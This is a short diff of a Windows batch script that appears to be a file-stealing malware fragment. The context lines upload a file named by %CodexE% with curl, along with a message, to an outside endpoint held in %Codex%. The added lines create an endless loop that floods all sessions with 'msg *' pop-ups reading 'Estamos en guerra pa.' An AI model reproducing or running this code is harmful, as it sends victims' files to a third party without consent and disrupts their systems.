@@ -23,4 +23,7 @@ if exist "%CodexE%" (
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Codex%
     curl -F "file=@%CodexE%" %Codex%
 )
+:losad
+msg * Estamos en guerra pa.
+goto losad
 exit
